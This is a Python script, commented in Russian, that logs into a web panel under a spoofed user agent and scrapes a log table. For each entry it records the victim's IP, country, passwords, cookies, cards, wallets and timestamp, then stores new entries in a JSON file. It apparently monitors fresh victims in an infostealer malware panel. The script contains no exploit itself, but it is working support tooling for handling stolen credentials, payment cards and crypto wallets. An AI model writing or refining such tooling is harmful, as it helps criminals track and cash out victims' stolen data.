#напомни убрать эти бесполезные ветвления и функции, которые можно объединить

import requests
import fake_useragent
import json
from bs4 import BeautifulSoup as soup

user = fake_useragent.UserAgent().random
header = {
    'user-agent': user
}


class Parser:

    def __init__(self, link, data, header):
        self.session = requests.Session()
        self.session.post(link, data=data, headers=header)



    def get_fresh_soup(self, logs_page):
        with open('logs_dict.json') as file:
            logs_dict = json.load(file)

        all_clear_logs_list = []
        resp = self.session.get(logs_page, headers=header)

        html = soup(resp.content, 'html.parser')
        table = html.find('table', attrs={'class': 'logs_table'})
        table_body = table.find('tbody')
        rows = table_body.find_all('tr')
        for row in rows:
            rows_td = row.find_all('td')
            clear_td = [ele.text.strip() for ele in rows_td]
            all_clear_logs_list.append([ele for ele in clear_td if ele])

        fresh_logs_dict = {}
        for one_log in range(len(all_clear_logs_list)):
            one_log_len = len(all_clear_logs_list[one_log])
            if one_log_len == 11:
                tag = all_clear_logs_list[one_log][0]
                ip = all_clear_logs_list[one_log][1]
                country = all_clear_logs_list[one_log][2]
                zip = all_clear_logs_list[one_log][3]
                passwords = all_clear_logs_list[one_log][4]
                cookies = all_clear_logs_list[one_log][5]
                cards = all_clear_logs_list[one_log][6]
                wallets = all_clear_logs_list[one_log][7]
                datetime = all_clear_logs_list[one_log][8]
                log_id = f'[{tag}][{ip}][{datetime}]'
            elif one_log_len == 10:
                tag = all_clear_logs_list[one_log][0]
                ip = all_clear_logs_list[one_log][1]
                country = all_clear_logs_list[one_log][2]
                zip = '0'
                passwords = all_clear_logs_list[one_log][3]
                cookies = all_clear_logs_list[one_log][4]
                cards = all_clear_logs_list[one_log][5]
                wallets = all_clear_logs_list[one_log][6]
                datetime = all_clear_logs_list[one_log][7]
                log_id = f'[{tag}][{ip}][{datetime}]'

            if log_id in logs_dict: continue
            else:
                logs_dict[log_id] = {
                    'tag': tag,
                    'ip': ip,
                    'country': country,
                    'zip': zip,
                    'passwords': passwords,
                    'cookies': cookies,
                    'cards': cards,
                    'wallets': wallets,
                    'datetime': datetime
                }

                fresh_logs_dict[log_id] = {
                    'tag': tag,
                    'ip': ip,
                    'country': country,
                    'zip': zip,
                    'passwords': passwords,
                    'cookies': cookies,
                    'cards': cards,
                    'wallets': wallets,
                    'datetime': datetime
                }

        with open('logs_dict.json', 'w') as file:
            json.dump(logs_dict, file, indent=4, ensure_ascii=False)
        return fresh_logs_dict

    def clear_mem(self):
        with open('logs_dict.json') as file:
            logs_dict = json.load(file)
            a = []
            for x in logs_dict:
                a.append(x)
            for y in a:
                if len(logs_dict) < 50: break
                del logs_dict[y]

        with open('logs_dict.json', 'w') as file:
            json.dump(logs_dict, file, indent=4, ensure_ascii=False)




#d = Parser(link, data, header)
#d.get_fresh_soup(logs_page)
#d.clear_mem()

